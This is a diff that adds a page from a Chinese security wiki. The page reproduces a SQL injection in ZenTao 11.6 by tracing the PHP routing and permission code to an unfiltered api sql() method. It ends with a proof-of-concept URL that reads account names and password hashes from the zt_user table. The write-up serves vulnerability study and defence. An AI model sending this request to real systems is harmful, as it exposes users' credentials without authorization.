@@ -1,0 +1,730 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="漏洞复现 | 代码审计 | 内网渗透 | 应急响应｜安全工具">
+      
+      
+      
+        <meta name="author" content="fengchenzxc">
+      
+      
+        <link rel="canonical" href="https://fengchenxzc.github.io/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-7.1.1">
+    
+    
+      
+        <title>禅道 11.6版本 SQL注入漏洞 - 安全WIKI</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.9299cb39.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ef6f36e2.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#546d78">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="blue-grey" data-md-color-accent="pink">
+  
+    
+    <script>function __prefix(e){return new URL("../../../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#116-sql" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="安全WIKI" class="md-header__button md-logo" aria-label="安全WIKI" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            安全WIKI
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              禅道 11.6版本 SQL注入漏洞
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        
+<a href="https://github.com/fengchenzxc/fengchenzxc.github.io/" title="前往 GitHub 仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    fengchenzxc/fengchenzxc.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="安全WIKI" class="md-nav__button md-logo" aria-label="安全WIKI" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    安全WIKI
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/fengchenzxc/fengchenzxc.github.io/" title="前往 GitHub 仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    fengchenzxc/fengchenzxc.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        一. 介绍
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      <label class="md-nav__link" for="__nav_2">
+        二. 漏洞复现
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="二. 漏洞复现" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          二. 漏洞复现
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1" type="checkbox" id="__nav_2_1" >
+      
+      <label class="md-nav__link" for="__nav_2_1">
+        1. Web应用漏洞
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="1. Web应用漏洞" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          1. Web应用漏洞
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_1_1" type="checkbox" id="__nav_2_1_1" >
+      
+      <label class="md-nav__link" for="__nav_2_1_1">
+        F5 BIG-IP
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="F5 BIG-IP" data-md-level="3">
+        <label class="md-nav__title" for="__nav_2_1_1">
+          <span class="md-nav__icon md-icon"></span>
+          F5 BIG-IP
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/F5%20BIG-IP/F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-22986/" class="md-nav__link">
+        F5 BIG-IP 远程代码执行漏洞 CVE-2021-22986
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    漏洞描述
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    影响版本
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    环境搭建
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    漏洞复现
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#poc" class="md-nav__link">
+    漏洞利用POC
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/fengchenzxc/fengchenzxc.github.io/edit/master/docs/漏洞复现/CMS漏洞/禅道CMS/禅道 11.6版本 SQL注入漏洞.md" title="编辑此页" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                <h1 id="116-sql">禅道 11.6版本 SQL注入漏洞<a class="headerlink" href="#116-sql" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入</p>
+<h2 id="_2">影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>[!NOTE]</p>
+<p>禅道 11.6</p>
+</blockquote>
+<h2 id="_3">环境搭建<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>这里使用docker环境搭建</p>
+<div class="highlight"><pre><span></span><code>docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6
+</code></pre></div>
+<p>访问 <strong><a href="http://xxx.xxx.xxx.xxx:8084">http://xxx.xxx.xxx.xxx:8084</a></strong> 按步骤安装即可</p>
+<p><img alt="" src="../image/zentao-1.png" /></p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>先对禅道的调用流程进行分析,先查看目录为**www/index.php**首页文件中</p>
+<p><img alt="" src="../image/zentao-15.png" /></p>
+<p>这里使用**router::createApp**创建了一个APP对象</p>
+<div class="highlight"><pre><span></span><code><span class="x">$app = router::createApp(&#39;pms&#39;, dirname(dirname(__FILE__)), &#39;router&#39;);</span>
+</code></pre></div>
+<p>来到**framework/base/router.class.php**文件查看到**createApp**方法</p>
+<p><img alt="" src="../image/zentao-16.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="x"> public static function createApp($appName = &#39;demo&#39;, $appRoot = &#39;&#39;, $className = &#39;&#39;)</span>
+<span class="x">    {</span>
+<span class="x">        if(empty($className)) $className = __CLASS__;</span>
+<span class="x">        return new $className($appName, $appRoot);</span>
+<span class="x">    }</span>
+</code></pre></div>
+<p>这里New了一个对象，查看一下调用方法(348行)</p>
+<p><img alt="" src="../image/zentao-17.png" /></p>
+<p>在358行处调用了**setConfigRoot**方法</p>
+<div class="highlight"><pre><span></span><code><span class="x">$this-&gt;setConfigRoot();</span>
+
+<span class="x">public function setConfigRoot()</span>
+<span class="x">    {</span>
+<span class="x">        $this-&gt;configRoot = $this-&gt;basePath . &#39;config&#39; . DS;</span>
+<span class="x">    }</span>
+</code></pre></div>
+<p>在363行处调用了**loadMainConfig**方法</p>
+<div class="highlight"><pre><span></span><code><span class="x">$this-&gt;loadMainConfig();</span>
+
+<span class="x">public function loadMainConfig()</span>
+<span class="x">    {</span>
+<span class="x">        /* 初始化$config对象。Init the $config object. */</span>
+<span class="x">        global $config, $filter;</span>
+<span class="x">        if(!is_object($config)) $config = new config();</span>
+<span class="x">        $this-&gt;config = $config;</span>
+
+<span class="x">        /* 加载主配置文件。 Load the main config file. */</span>
+<span class="x">        $mainConfigFile = $this-&gt;configRoot . &#39;config.php&#39;;</span>
+<span class="x">        if(!file_exists($mainConfigFile)) $this-&gt;triggerError(&quot;The main config file $mainConfigFile not found&quot;, __FILE__, __LINE__, $exit = true);</span>
+<span class="x">        include $mainConfigFile;</span>
+<span class="x">    }</span>
+</code></pre></div>
+<p>这里包含了配置文件**config.php**配置文件，文件目录为**/config/config.php**</p>
+<p>在25行定义了调用方法</p>
+<div class="highlight"><pre><span></span><code><span class="x">$config-&gt;requestType = &#39;PATH_INFO&#39;;         // 请求类型：PATH_INFO|PATHINFO2|GET。    The request type: PATH_INFO|PATH_INFO2|GET.</span>
+<span class="x">$config-&gt;requestFix  = &#39;-&#39;;                 // PATH_INFO和PATH_INFO2模式的分隔符。    The divider in the url when PATH_INFO|PATH_INFO2.</span>
+<span class="x">$config-&gt;moduleVar   = &#39;m&#39;;                 // 请求类型为GET：模块变量名。            requestType=GET: the module var name.</span>
+<span class="x">$config-&gt;methodVar   = &#39;f&#39;;                 // 请求类型为GET：模块变量名。            requestType=GET: the method var name.</span>
+<span class="x">$config-&gt;viewVar     = &#39;t&#39;;                 // 请求类型为GET：视图变量名。            requestType=GET: the view var name.</span>
+<span class="x">$config-&gt;sessionVar  = &#39;zentaosid&#39;;         // 请求类型为GET：session变量名。         requestType=GET: the session var name.</span>
+<span class="x">$config-&gt;views       = &#39;,html,json,mhtml,xhtml,&#39;; // 支持的视图类型。                       Supported view formats.</span>
+</code></pre></div>
+<p>可以发现这里存在两种路由**PATH_INFO|PATH_INFO2**：一种是m、f、t来进行调用。另外一种是通过-来进行调用</p>
+<p>在**index.php**中的**66行**</p>
+<div class="highlight"><pre><span></span><code><span class="x">$app-&gt;parseRequest();</span>
+
+<span class="x">public function parseRequest()</span>
+<span class="x">    {</span>
+<span class="x">        if($this-&gt;config-&gt;requestType == &#39;PATH_INFO&#39; or $this-&gt;config-&gt;requestType == &#39;PATH_INFO2&#39;)</span>
+<span class="x">        {</span>
+<span class="x">            $this-&gt;parsePathInfo();</span>
+<span class="x">            $this-&gt;setRouteByPathInfo();</span>
+<span class="x">        }</span>
+<span class="x">        elseif($this-&gt;config-&gt;requestType == &#39;GET&#39;)</span>
+<span class="x">        {</span>
+<span class="x">            $this-&gt;parseGET();</span>
+<span class="x">            $this-&gt;setRouteByGET();</span>
+<span class="x">        }</span>
+<span class="x">        else</span>
+<span class="x">        {</span>
+<span class="x">            $this-&gt;triggerError(&quot;The request type {$this-&gt;config-&gt;requestType} not supported&quot;, __FILE__, __LINE__, $exit = true);</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+</code></pre></div>
+<p>看到这一条则是判断力两种调用方法</p>
+<div class="highlight"><pre><span></span><code><span class="x">$this-&gt;config-&gt;requestType == &#39;PATH_INFO&#39; or $this-&gt;config-&gt;requestType == &#39;PATH_INFO2&#39;</span>
+</code></pre></div>
+<p>跟进**setRouteByPathInfo方法**</p>
+<div class="highlight"><pre><span></span><code><span class="x">public function setRouteByPathInfo()</span>
+<span class="x">    {</span>
+<span class="x">        if(!empty($this-&gt;URI))</span>
+<span class="x">        {</span>
+<span class="x">            /*</span>
+<span class="x">             * 根据$requestFix分割符，分割网址。</span>
+<span class="x">             * There&#39;s the request seperator, split the URI by it.</span>
+<span class="x">             **/</span>
+<span class="x">            if(strpos($this-&gt;URI, $this-&gt;config-&gt;requestFix) !== false)</span>
+<span class="x">            {</span>
+<span class="x">                $items = explode($this-&gt;config-&gt;requestFix, $this-&gt;URI);</span>
+<span class="x">                $this-&gt;setModuleName($items[0]);</span>
+<span class="x">                $this-&gt;setMethodName($items[1]);</span>
+<span class="x">            }    </span>
+<span class="x">            /*</span>
+<span class="x">             * 如果网址中没有分隔符，使用默认的方法。</span>
+<span class="x">             * No reqeust seperator, use the default method name.</span>
+<span class="x">             **/</span>
+<span class="x">            else</span>
+<span class="x">            {</span>
+<span class="x">                $this-&gt;setModuleName($this-&gt;URI);</span>
+<span class="x">                $this-&gt;setMethodName($this-&gt;config-&gt;default-&gt;method);</span>
+<span class="x">            }</span>
+<span class="x">        }</span>
+<span class="x">        else</span>
+<span class="x">        {    </span>
+<span class="x">            $this-&gt;setModuleName($this-&gt;config-&gt;default-&gt;module);   // 使用默认模块 use the default module.</span>
+<span class="x">            $this-&gt;setMethodName($this-&gt;config-&gt;default-&gt;method);   // 使用默认方法 use the default method.</span>
+<span class="x">        }</span>
+<span class="x">        $this-&gt;setControlFile();</span>
+<span class="x">    }</span>
+</code></pre></div>
+<p>所以可以推断出调用的方法</p>
+<p>例如**登录页面**有两种访问方法</p>
+<div class="highlight"><pre><span></span><code>http://xxx.xxx.xxx.xxx/index.php?m=user&amp;f=login
+http://xxx.xxx.xxx.xxx/user-login.html
+</code></pre></div>
+<p>再看一下**checkPriv方法**</p>
+<div class="highlight"><pre><span></span><code><span class="x">public function checkPriv()</span>
+<span class="x">    {</span>
+<span class="x">        $module = $this-&gt;app-&gt;getModuleName();</span>
+<span class="x">        $method = $this-&gt;app-&gt;getMethodName();</span>
+<span class="x">        if(!empty($this-&gt;app-&gt;user-&gt;modifyPassword) and (($module != &#39;my&#39; or $method != &#39;changepassword&#39;) and ($module != &#39;user&#39; or $method != &#39;logout&#39;))) die(js::locate(helper::createLink(&#39;my&#39;, &#39;changepassword&#39;)));</span>
+<span class="x">        if($this-&gt;isOpenMethod($module, $method)) return true;</span>
+<span class="x">        if(!$this-&gt;loadModel(&#39;user&#39;)-&gt;isLogon() and $this-&gt;server-&gt;php_auth_user) $this-&gt;user-&gt;identifyByPhpAuth();</span>
+<span class="x">        if(!$this-&gt;loadModel(&#39;user&#39;)-&gt;isLogon() and $this-&gt;cookie-&gt;za) $this-&gt;user-&gt;identifyByCookie();</span>
+
+<span class="x">        if(isset($this-&gt;app-&gt;user))</span>
+<span class="x">        {</span>
+<span class="x">            if(!commonModel::hasPriv($module, $method)) $this-&gt;deny($module, $method);</span>
+<span class="x">        }</span>
+<span class="x">        else</span>
+<span class="x">        {</span>
+<span class="x">            $referer  = helper::safe64Encode($this-&gt;app-&gt;getURI(true));</span>
+<span class="x">            die(js::locate(helper::createLink(&#39;user&#39;, &#39;login&#39;, &quot;referer=$referer&quot;)));</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+</code></pre></div>
+<p>这里检测了调用模块和方法的权限，可以知道除了**isOpenMethod**中定义的公开模块和方法之外，其他的方法都是需要登录的</p>
+<p>最后是**$app-&gt;loadModule();**这段代码</p>
+<div class="highlight"><pre><span></span><code><span class="x">public function loadModule()</span>
+<span class="x">    {</span>
+<span class="x">        $appName    = $this-&gt;appName;</span>
+<span class="x">        $moduleName = $this-&gt;moduleName;</span>
+<span class="x">        $methodName = $this-&gt;methodName;</span>
+
+<span class="x">        /* </span>
+<span class="x">         * 引入该模块的control文件。</span>
+<span class="x">         * Include the control file of the module.</span>
+<span class="x">         **/</span>
+<span class="x">        $file2Included = $this-&gt;setActionExtFile() ? $this-&gt;extActionFile : $this-&gt;controlFile;</span>
+<span class="x">        chdir(dirname($file2Included));</span>
+<span class="x">        helper::import($file2Included);</span>
+
+<span class="x">        /*</span>
+<span class="x">         * 设置control的类名。</span>
+<span class="x">         * Set the class name of the control.</span>
+<span class="x">         **/</span>
+<span class="x">        $className = class_exists(&quot;my$moduleName&quot;) ? &quot;my$moduleName&quot; : $moduleName;</span>
+<span class="x">        if(!class_exists($className)) $this-&gt;triggerError(&quot;the control $className not found&quot;, __FILE__, __LINE__, $exit = true);</span>
+
+<span class="x">        /*</span>
+<span class="x">         * 创建control类的实例。</span>
+<span class="x">         * Create a instance of the control.</span>
+<span class="x">         **/</span>
+<span class="x">        $module = new $className();</span>
+<span class="x">        if(!method_exists($module, $methodName)) $this-&gt;triggerError(&quot;the module $moduleName has no $methodName method&quot;, __FILE__, __LINE__, $exit = true);</span>
+<span class="x">        $this-&gt;control = $module;</span>
+
+<span class="x">        /* include default value for module*/</span>
+<span class="x">        $defaultValueFiles = glob($this-&gt;getTmpRoot() . &quot;defaultvalue/*.php&quot;);</span>
+<span class="x">        if($defaultValueFiles) foreach($defaultValueFiles as $file) include $file;</span>
+
+<span class="x">        /* </span>
+<span class="x">         * 使用反射机制获取函数参数的默认值。</span>
+<span class="x">         * Get the default settings of the method to be called using the reflecting. </span>
+<span class="x">         *</span>
+<span class="x">         * */</span>
+<span class="x">        $defaultParams = array();</span>
+<span class="x">        $methodReflect = new reflectionMethod($className, $methodName);</span>
+<span class="x">        foreach($methodReflect-&gt;getParameters() as $param)</span>
+<span class="x">        {</span>
+<span class="x">            $name = $param-&gt;getName();</span>
+
+<span class="x">            $default = &#39;_NOT_SET&#39;;</span>
+<span class="x">            if(isset($paramDefaultValue[$appName][$className][$methodName][$name]))</span>
+<span class="x">            {</span>
+<span class="x">                $default = $paramDefaultValue[$appName][$className][$methodName][$name];</span>
+<span class="x">            }</span>
+<span class="x">            elseif(isset($paramDefaultValue[$className][$methodName][$name]))</span>
+<span class="x">            {</span>
+<span class="x">                $default = $paramDefaultValue[$className][$methodName][$name];</span>
+<span class="x">            }</span>
+<span class="x">            elseif($param-&gt;isDefaultValueAvailable())</span>
+<span class="x">            {</span>
+<span class="x">                $default = $param-&gt;getDefaultValue();</span>
+<span class="x">            }</span>
+
+<span class="x">            $defaultParams[$name] = $default;</span>
+<span class="x">        }</span>
+
+<span class="x">        /** </span>
+<span class="x">         * 根据PATH_INFO或者GET方式设置请求的参数。</span>
+<span class="x">         * Set params according PATH_INFO or GET.</span>
+<span class="x">         */</span>
+<span class="x">        if($this-&gt;config-&gt;requestType != &#39;GET&#39;)</span>
+<span class="x">        {</span>
+<span class="x">            $this-&gt;setParamsByPathInfo($defaultParams);</span>
+<span class="x">        }</span>
+<span class="x">        else</span>
+<span class="x">        {</span>
+<span class="x">            $this-&gt;setParamsByGET($defaultParams);</span>
+<span class="x">        }</span>
+
+<span class="x">        if($this-&gt;config-&gt;framework-&gt;filterParam == 2)</span>
+<span class="x">        {</span>
+<span class="x">            $_GET     = validater::filterParam($_GET, &#39;get&#39;);</span>
+<span class="x">            $_COOKIE  = validater::filterParam($_COOKIE, &#39;cookie&#39;);</span>
+<span class="x">        }</span>
+
+<span class="x">        /* 调用该方法   Call the method. */</span>
+<span class="x">        call_user_func_array(array($module, $methodName), $this-&gt;params);</span>
+<span class="x">        return $module;</span>
+<span class="x">    }</span>
+</code></pre></div>
+<p>通过之前获取的**moduleName**包含对应的**control类**文件并实例化，随后调用**setParamsByPathInfo**方法从路径中获取方法对应的参数值，最后通过**call_user_func_array**方法调用对应**control类**中的对应方法并赋值。</p>
+<p>我们查看**module/api/control.php**文件中的**getModel**方法</p>
+<p><img alt="" src="../image/zentao-19.png" /></p>
+<p>这里通过**call_user_func_array**函数调用所有的**model文件**的所有方法。</p>
+<div class="highlight"><pre><span></span><code><span class="x">$result = call_user_func_array(array(&amp;$module, $methodName), $params);</span>
+</code></pre></div>
+<p>可以看到**module/api/moudel.php**中的**sql函数**</p>
+<div class="highlight"><pre><span></span><code><span class="x">public function sql($sql, $keyField = &#39;&#39;)</span>
+<span class="x">{</span>
+<span class="x">    $sql  = trim($sql);</span>
+<span class="x">    if(strpos($sql, &#39;;&#39;) !== false) $sql = substr($sql, 0, strpos($sql, &#39;;&#39;));</span>
+<span class="x">    a($sql);</span>
+<span class="x">    if(empty($sql)) return &#39;&#39;;</span>
+
+<span class="x">    if(stripos($sql, &#39;select &#39;) !== 0)</span>
+<span class="x">    {</span>
+<span class="x">        return $this-&gt;lang-&gt;api-&gt;error-&gt;onlySelect;</span>
+<span class="x">    }</span>
+<span class="x">    else</span>
+<span class="x">    {</span>
+<span class="x">        try</span>
+<span class="x">        {</span>
+<span class="x">            $stmt = $this-&gt;dao-&gt;query($sql);</span>
+<span class="x">            if(empty($keyField)) return $stmt-&gt;fetchAll();</span>
+<span class="x">            $rows = array();</span>
+<span class="x">            while($row = $stmt-&gt;fetch()) $rows[$row-&gt;$keyField] = $row;</span>
+<span class="x">            return $rows;</span>
+<span class="x">        }</span>
+<span class="x">        catch(PDOException $e)</span>
+<span class="x">        {</span>
+<span class="x">            return $e-&gt;getMessage();</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</code></pre></div>
+<p>这里并没有进行过滤，只使用了代码**<span><span class="MathJax_Preview">sql=trim(</span><script type="math/tex">sql=trim(</script></span>sql)**过滤了空格</p>
+<p>我们看一下这里的调用这个方法需要的权限</p>
+<p><img alt="" src="../image/zentao-20.png" /></p>
+<p>这里可以看到任何用户都可以调用这个模块的方法，所以我们用它调用**sql**方法进行查询(空格转换为+,绕过过滤)</p>
+<div class="highlight"><pre><span></span><code>http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user
+</code></pre></div>
+<p><img alt="" src="../image/zentao-21.png" /></p>
+<p>成功执行sql语句</p>
+<h2 id="poc">漏洞利用POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p>登陆后访问</p>
+<div class="highlight"><pre><span></span><code>http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user
+</code></pre></div>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        
+<footer class="md-footer">
+  
